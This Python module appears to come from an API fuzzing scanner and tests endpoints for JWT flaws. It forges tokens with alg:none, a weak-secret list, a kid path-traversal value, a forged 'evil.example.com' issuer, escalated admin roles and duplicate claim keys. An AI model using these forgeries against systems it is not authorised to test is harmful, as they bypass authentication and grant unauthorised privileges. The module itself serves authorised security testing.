"""JWT-specific attacks (Phase 3 rework).

If the provided Authorization header carries a JWT, run a battery of
forged tokens against a representative endpoint. Findings are now
**differential**: an anonymous baseline is established first, and forged-token
responses are compared against it. A forged token is only flagged when it
produces a 2xx that is materially different from the anonymous baseline —
preventing false positives on public endpoints.

All JWT manipulation is implemented with stdlib only (`base64`, `hmac`,
`hashlib`, `json`) so apifuzz keeps its dependency footprint tight.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

import requests

from analyzer import Finding
from comparators import ResponseComparison, compare_http_responses



CATEGORY = "jwt"

# Try-list for weak HMAC secrets.
WEAK_HMAC_SECRETS = [
    "secret", "secret123", "password", "1234", "12345", "123456",
    "changeme", "default", "jwt", "key", "test", "admin", "your-256-bit-secret",
    "", "null", "none",
]

# HS algorithm family supported for weak-secret signing.
HS_ALGORITHMS = {
    "HS256": hashlib.sha256,
    "HS384": hashlib.sha384,
    "HS512": hashlib.sha512,
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def parse_bearer_jwt(auth_header: Optional[str]) -> Optional[Tuple[Dict, Dict, bytes, str]]:
    """Parse a Bearer JWT auth header. Returns (header, payload, signature, raw_token)
    or None if it doesn't look like a JWT.
    """
    if not auth_header:
        return None
    val = auth_header.strip()
    if val.lower().startswith("authorization:"):
        val = val.split(":", 1)[1].strip()
    if val.lower().startswith("bearer "):
        val = val[7:].strip()
    parts = val.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        signature = _b64url_decode(parts[2]) if parts[2] else b""
    except Exception:
        return None
    if not isinstance(header, dict) or "alg" not in header:
        return None
    return header, payload, signature, val


def _build_token(header: Dict, payload: Dict, signature: bytes) -> str:
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = _b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def _sign_hs(header: Dict, payload: Dict, secret: bytes, algorithm: str = "HS256") -> str:
    """Sign a token with the specified HS algorithm (HS256/384/512)."""
    hash_func = HS_ALGORITHMS.get(algorithm.upper(), hashlib.sha256)
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(secret, signing_input, hash_func).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _mk(
    severity: str,
    title: str,
    *,
    endpoint: str,
    method: str,
    request_url: str,
    evidence: str,
    payload: str = "",
    technique: str = "JWT forgery",
    status_code: int = 0,
    request_headers: Optional[Dict[str, str]] = None,
    response_body: Optional[str] = None,
    response_headers: Optional[Dict[str, str]] = None,
    confidence: str = "strong",
    comparison_summary: str = "",
) -> Finding:
    from analyzer import capture_body
    captured, truncated = capture_body(response_body)
    return Finding(
        severity=severity,
        category=CATEGORY,
        title=title,
        endpoint=endpoint,
        method=method,
        parameter="Authorization",
        location="header",
        payload=payload,
        technique=technique,
        evidence=evidence,
        status_code=status_code,
        response_time_ms=0,
        request_url=request_url,
        request_headers=dict(request_headers or {}),
        request_body=None,
        response_body=captured,
        response_headers=dict(response_headers or {}),
        response_truncated=truncated,
        confidence=confidence,
        owasp_api="API2:2023",
        cwe="CWE-347",
        comparison_summary=comparison_summary,
    )


# ---------------------------------------------------------------------------
# Differential evaluation
# ---------------------------------------------------------------------------


@dataclass
class JWTObservation:
    """A single JWT probe observation for differential comparison."""
    label: str
    token: str
    status_code: int = 0
    headers: Dict[str, str] = field(default_factory=dict)
    body: str = ""
    error: Optional[str] = None


def _send_token(
    session: requests.Session,
    method: str,
    url: str,
    token: str,
    timeout: float,
) -> Optional[JWTObservation]:
    """Send a request with a forged token and return the observation."""
    forged_headers = {"Authorization": f"Bearer {token}"}
    try:
        resp = session.request(
            method, url, headers=forged_headers,
            timeout=timeout, allow_redirects=False,
        )
        return JWTObservation(
            label="",
            token=token,
            status_code=resp.status_code,
            headers=dict(resp.headers),
            body=resp.text or "",
        )
    except requests.exceptions.RequestException as exc:
        return JWTObservation(label="", token=token, error=str(exc))


def _send_anonymous(
    session: requests.Session,
    method: str,
    url: str,
    timeout: float,
) -> Optional[JWTObservation]:
    """Send a request with no Authorization header."""
    try:
        resp = session.request(
            method, url, timeout=timeout, allow_redirects=False,
        )
        return JWTObservation(
            label="anonymous",
            token="",
            status_code=resp.status_code,
            headers=dict(resp.headers),
            body=resp.text or "",
        )
    except requests.exceptions.RequestException as exc:
        return JWTObservation(label="anonymous", token="", error=str(exc))


def _evaluate_forgery(
    forged: JWTObservation,
    anonymous: Optional[JWTObservation],
) -> Tuple[bool, str]:
    """Determine whether a forged token represents a real vulnerability.

    Returns (is_vulnerable, comparison_summary).
    A forged token is only flagged when:
      1. It produces a 2xx response, AND
      2. The anonymous baseline did NOT also produce a materially
         equivalent 2xx (i.e., the endpoint is not public).
    """
    if forged.error or not (200 <= forged.status_code < 300):
        return False, ""

    if anonymous is None or anonymous.error:
        # No anonymous baseline — flag but with lower confidence.
        return True, "No anonymous baseline available for comparison."

    anon_success = 200 <= anonymous.status_code < 300
    if anon_success:
        comparison = compare_http_responses(
            baseline_status=anonymous.status_code,
            baseline_headers=anonymous.headers,
            baseline_body=anonymous.body,
            candidate_status=forged.status_code,
            candidate_headers=forged.headers,
            candidate_body=forged.body,
        )
        if comparison.equivalent:
            return False, (
                f"Forged token response equivalent to anonymous baseline "
                f"({comparison.summary}) — endpoint appears public."
            )

    return True, (
        f"Forged token produced 2xx while anonymous baseline did not "
        f"(anonymous: {anonymous.status_code}, forged: {forged.status_code})."
    )


# ---------------------------------------------------------------------------
# Token forgery generators
# ---------------------------------------------------------------------------


def _forge_alg_none(header: Dict, payload: Dict) -> Tuple[str, str, str]:
    none_header = {**header, "alg": "none"}
    return _build_token(none_header, payload, b""), "JWT alg:none accepted", "alg:none"


def _forge_weak_hmac(header: Dict, payload: Dict, secret: str, alg: str = "HS256") -> Tuple[str, str, str]:
    forged = _sign_hs(header, payload, secret.encode(), alg)
    return forged, f"JWT signed with weak HMAC secret accepted: {secret!r}", f"weak HMAC secret ({alg})"


def _forge_expired(header: Dict, payload: Dict, signature: bytes) -> Tuple[str, str, str]:
    expired_payload = dict(payload)
    expired_payload["exp"] = int(time.time()) - 3600
    return _build_token(header, expired_payload, signature), "Expired JWT accepted", "expired token replay"


def _forge_kid_traversal(header: Dict, payload: Dict) -> Tuple[str, str, str]:
    kid_header = dict(header)
    kid_header["kid"] = "../../../../../../dev/null"
    try:
        kid_token = _sign_hs({**kid_header, "alg": "HS256"}, payload, b"")
    except Exception:
        kid_token = _build_token({**kid_header, "alg": "none"}, payload, b"")
    return kid_token, "JWT kid path-traversal accepted", "kid injection"


def _forge_claim_mutation(
    header: Dict, payload: Dict, signature: bytes, claim: str, value: Any, title: str, technique: str,
) -> Tuple[str, str, str]:
    """Forge a token with a mutated claim, reusing the original signature."""
    mutated = dict(payload)
    mutated[claim] = value
    return _build_token(header, mutated, signature), title, technique


# ---------------------------------------------------------------------------
# Probes
# ---------------------------------------------------------------------------

def run_jwt_attacks(
    *,
    auth_header: Optional[str],
    target_url: str,
    target_method: str,
    target_endpoint_path: str,
    baseline_status: int,
    session: requests.Session,
    timeout: float,
) -> List[Finding]:
    """Attempt JWT forgeries against the given target endpoint.

    Phase 3 rework: establishes an anonymous baseline and only flags
    forged tokens that produce a materially different 2xx response.
    """
    parsed = parse_bearer_jwt(auth_header)
    if parsed is None:
        return []
    header, payload, signature, raw_token = parsed
    findings: List[Finding] = []
    alg = str(header.get("alg", "")).upper()


    # Establish anonymous baseline for differential comparison.
    anon_obs = _send_anonymous(session, target_method, target_url, timeout)

    def _try(token: str, title: str, severity: str, evidence: str, technique: str):
        obs = _send_token(session, target_method, target_url, token, timeout)
        if obs is None or obs.error:
            return
        is_vuln, comparison = _evaluate_forgery(obs, anon_obs)
        if is_vuln:
            confidence = "strong" if anon_obs and not (200 <= anon_obs.status_code < 300) else "medium"
            findings.append(
                _mk(
                    severity,
                    title,
                    endpoint=target_endpoint_path,
                    method=target_method,
                    request_url=target_url,
                    evidence=f"{evidence} (HTTP {obs.status_code}). {comparison}",
                    payload=token,
                    technique=technique,
                    status_code=obs.status_code,
                    request_headers={"Authorization": f"Bearer {token}"},
                    response_body=obs.body,
                    response_headers=obs.headers,
                    confidence=confidence,
                    comparison_summary=comparison,
                )
            )

    # 1. alg: none
    token, title, technique = _forge_alg_none(header, payload)
    _try(token, title, "critical",
          "Server accepted a token forged with alg=none and an empty signature",
          technique)

    # 2. Weak HMAC secret (only if original header.alg is an HS variant)
    if alg.startswith("HS"):
        for secret in WEAK_HMAC_SECRETS:
            token, title, technique = _forge_weak_hmac(header, payload, secret, alg)
            _try(token, title, "critical",
                  f"Server accepted a token signed with HMAC secret {secret!r}",
                  technique)

    # 3. Expired token replay
    token, title, technique = _forge_expired(header, payload, signature)
    _try(token, title, "high",
          "Server accepted a token whose 'exp' claim was set to an hour ago",
          technique)

    # 4. kid injection — path traversal style
    if "kid" in header or alg.startswith("HS") or alg.startswith("RS"):
        token, title, technique = _forge_kid_traversal(header, payload)
        _try(token, title, "high",
              "Server accepted a token with kid pointing at a traversable file",
              technique)

    # 5. Claim mutations (Phase 3 additions)
    now = int(time.time())

    # iss (issuer) mutation
    token, title, technique = _forge_claim_mutation(
        header, payload, signature, "iss", "https://evil.example.com",
        "JWT with forged 'iss' claim accepted", "iss claim mutation",
    )
    _try(token, title, "high",
          "Server accepted a token with a forged issuer claim",
          technique)

    # aud (audience) mutation
    token, title, technique = _forge_claim_mutation(
        header, payload, signature, "aud", "attacker-controlled-audience",
        "JWT with forged 'aud' claim accepted", "aud claim mutation",
    )
    _try(token, title, "high",
          "Server accepted a token with a forged audience claim",
          technique)

    # nbf (not-before) mutation — set to future
    token, title, technique = _forge_claim_mutation(
        header, payload, signature, "nbf", now + 86400,
        "JWT with future 'nbf' claim accepted", "nbf claim mutation",
    )
    _try(token, title, "medium",
          "Server accepted a token whose 'nbf' is in the future",
          technique)

    # iat (issued-at) mutation — set to far past
    token, title, technique = _forge_claim_mutation(
        header, payload, signature, "iat", now - 86400 * 365,
        "JWT with forged 'iat' claim accepted", "iat claim mutation",
    )
    _try(token, title, "low",
          "Server accepted a token with a forged issued-at claim",
          technique)

    # exp (expiration) mutation — set to far future
    token, title, technique = _forge_claim_mutation(
        header, payload, signature, "exp", now + 86400 * 365,
        "JWT with forged 'exp' claim accepted", "exp claim mutation",
    )
    _try(token, title, "medium",
          "Server accepted a token with an expiration far in the future",
          technique)

    # role/scope escalation (if role or scope claims present)
    for claim_name in ("role", "scope", "roles", "scopes", "permissions"):
        if claim_name in payload:
            escalated_value = "admin" if "role" in claim_name.lower() else ["admin", "superuser", "*"]
            token, title, technique = _forge_claim_mutation(
                header, payload, signature, claim_name, escalated_value,
                f"JWT with escalated '{claim_name}' claim accepted", f"{claim_name} claim escalation",
            )
            _try(token, title, "high",
                  f"Server accepted a token with escalated '{claim_name}' claim",
                  technique)

    # Duplicate claim keys (parser confusion)
    try:
        h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        payload_str = json.dumps(payload, separators=(",", ":"))
        dup_payload = payload_str.rstrip("}") + f',"{list(payload.keys())[0]}":"attacker"' + "}"
        dup_token = f"{h}.{_b64url_encode(dup_payload.encode())}.{_b64url_encode(signature)}"
        _try(dup_token, "JWT with duplicate claim key accepted", "medium",
              "Server accepted a token with duplicate claim keys (parser confusion)",
              "duplicate claim key")
    except Exception:
        pass  # pragma: no cover

    return findings

    return findings
